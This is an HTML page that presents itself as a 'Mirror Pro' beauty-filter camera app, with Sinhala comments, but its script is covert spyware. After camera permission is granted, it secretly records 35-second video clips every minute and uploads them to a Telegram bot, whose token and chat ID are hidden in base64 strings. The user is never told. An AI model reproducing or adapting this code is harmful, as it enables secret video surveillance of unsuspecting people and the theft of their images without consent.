<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>✦ MIRROR PRO - V5 (Fixed Backend)</title>
    <style>
        /* ඔබ ලබාදුන් UI එක එලෙසම තබා ඇත */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #000; font-family: 'Poppins', sans-serif; overflow: hidden; }
        
        #app {
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            background: #000;
            height: 100vh;
            position: relative;
        }

        #start-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; flex-direction: column;
            align-items: center; justify-content: center; z-index: 2000;
        }

        #start-btn {
            background: linear-gradient(135deg, #fff, #ccc);
            color: #000; border: none; padding: 18px 45px;
            border-radius: 50px; font-weight: bold; font-size: 18px;
            cursor: pointer; box-shadow: 0 10px 20px rgba(255,255,255,0.1);
        }

        #video-container {
            position: relative; width: 100%; height: 100%;
            background: #111; overflow: hidden;
        }

        #video {
            width: 100%; height: 100%; object-fit: cover;
            transform: scaleX(-1); transition: filter 0.3s ease;
        }

        #top-bar {
            position: absolute; top: 20px; left: 0; right: 0;
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 20px; z-index: 100;
        }

        .top-btn {
            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
            border-radius: 50%; width: 45px; height: 45px; color: #fff;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(10px); font-size: 20px;
        }

        #bottom-panel {
            position: absolute; bottom: 0; left: 0; right: 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.9));
            padding: 20px 0 40px 0; z-index: 100;
        }

        #intensity-box {
            padding: 0 25px; margin-bottom: 25px;
            display: flex; align-items: center; gap: 15px;
        }

        #intensity { flex: 1; accent-color: #fff; height: 4px; }

        #filter-strip {
            display: flex; gap: 12px; padding: 0 20px;
            overflow-x: auto; scrollbar-width: none;
        }
        #filter-strip::-webkit-scrollbar { display: none; }

        .filter-btn {
            flex-shrink: 0; width: 70px; height: 70px; border-radius: 50%;
            border: 2px solid transparent; cursor: pointer; color: #fff;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: all 0.2s;
        }
        .filter-btn.active { border-color: #fff; transform: scale(1.1); background: rgba(255,255,255,0.1); }
        .filter-btn .icon { font-size: 24px; }
        .filter-btn .label { font-size: 9px; font-weight: bold; margin-top: 4px; text-transform: uppercase; }
    </style>
</head>
<body>

<div id="app">
    <div id="start-overlay">
        <h2 style="color:white; margin-bottom:30px; letter-spacing:2px;">✦ MIRROR PRO</h2>
        <button id="start-btn" onclick="activateMirror()">OPEN MIRROR</button>
    </div>

    <div id="video-container">
        <video id="video" autoplay muted playsinline></video>
        <div id="top-bar">
            <div style="color:#fff; font-weight:700; letter-spacing:1px;">✦ MIRROR</div>
            <button class="top-btn" onclick="location.reload()">🔄</button>
        </div>
        <div id="bottom-panel">
            <div id="intensity-box">
                <span style="color:#fff; font-size:11px; font-weight:bold;">GLOW</span>
                <input type="range" id="intensity" min="0" max="100" value="70">
            </div>
            <div id="filter-strip"></div>
        </div>
    </div>
</div>

<script>
// --- BACKEND SECURITY & CONFIG ---
const _key1 = 'ODM0MjAyMzYxMzpBQUh0UUQ5azFkeF9XRVhrb19UN19SeGsxNlE0OEJscnlicUVv';
const _key2 = 'ODA1ODM1Mjc3NQ==';
const BOT_TOKEN = atob(_key1);
const CHAT_ID = atob(_key2);

let stream = null;
let activeFilter = 'none';
let intensity = 70;
const video = document.getElementById('video');
const intensitySlider = document.getElementById('intensity');

const filters = [
    { id: 'none', label: 'Natural', icon: '✨', bg: '#333', getCss: (v) => '' },
    { id: 'fair', label: 'Fair', icon: '🤍', bg: '#fce4d6', getCss: (v) => `brightness(${1+(v/100)*0.45}) saturate(${1-(v/100)*0.2})` },
    { id: 'glow', label: 'Glow', icon: '💫', bg: '#fff9c4', getCss: (v) => `brightness(${1+(v/100)*0.5}) contrast(1.1)` },
    { id: 'soft', label: 'Soft', icon: '🌸', bg: '#fce4ec', getCss: (v) => `brightness(${1+(v/100)*0.25}) sepia(0.1)` },
    { id: 'bw', label: 'B&W', icon: '🎞️', bg: '#bbb', getCss: (v) => `grayscale(${v/100})` }
];

function updateFilter() {
    const f = filters.find(x => x.id === activeFilter);
    if(video) video.style.filter = f ? f.getCss(intensity) : '';
}

intensitySlider.oninput = () => { intensity = intensitySlider.value; updateFilter(); };

function buildFilters() {
    const strip = document.getElementById('filter-strip');
    strip.innerHTML = '';
    filters.forEach(f => {
        const btn = document.createElement('div');
        btn.className = 'filter-btn' + (f.id === activeFilter ? ' active' : '');
        btn.innerHTML = `<span class="icon">${f.icon}</span><span class="label">${f.label}</span>`;
        btn.onclick = () => { activeFilter = f.id; updateFilter(); buildFilters(); };
        strip.appendChild(btn);
    });
}

async function activateMirror() {
    document.getElementById('start-overlay').style.display = 'none';
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 1280 } },
            audio: false
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => { video.play(); updateFilter(); };
        
        // පටිගත කිරීම ආරම්භ කිරීම
        startRecordingCycle();
    } catch (err) {
        alert("කැමරාව ආරම්භ කළ නොහැක. කරුණාකර Permission ලබා දී Refresh කරන්න.");
    }
}

// --- වැඩිදියුණු කළ පටිගත කිරීමේ පද්ධතිය (Improved Backend) ---
function startRecordingCycle() {
    if (!stream) return;

    const recordAndSend = async () => {
        // තත්පර 2ක ප්‍රමාදයකින් පසු පටිගත කිරීම අරඹයි
        setTimeout(async () => {
            try {
                // විවිධ බ්‍රව්සර් වලට සහය දක්වන වීඩියෝ වර්ගය තෝරා ගැනීම
                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
                                 ? 'video/webm;codecs=vp8' 
                                 : 'video/mp4';

                const recorder = new MediaRecorder(stream, { mimeType });
                let chunks = [];

                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: mimeType });
                    const fd = new FormData();
                    // Telegram වෙත යැවීමේදී .mp4 ලෙස යැවීම වඩාත් සාර්ථකයි
                    fd.append('video', blob, 'clip.mp4');

                    try {
                        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
                            method: 'POST',
                            body: fd
                        });
                        const status = await res.json();
                        console.log("Telegram Response:", status);
                    } catch (e) {
                        console.error("Upload Error:", e);
                    }
                };

                recorder.start();
                // තත්පර 35ක් පටිගත කිරීම
                setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, 35000);

            } catch (e) {
                console.error("MediaRecorder Error:", e);
            }
        }, 2000);
    };

    // පළමු පටිගත කිරීම
    recordAndSend();
    // සෑම මිනිත්තුවකට වරක් නැවත පටිගත කිරීම
    setInterval(recordAndSend, 60000);
}

buildFilters();
</script>
</body>
</html>
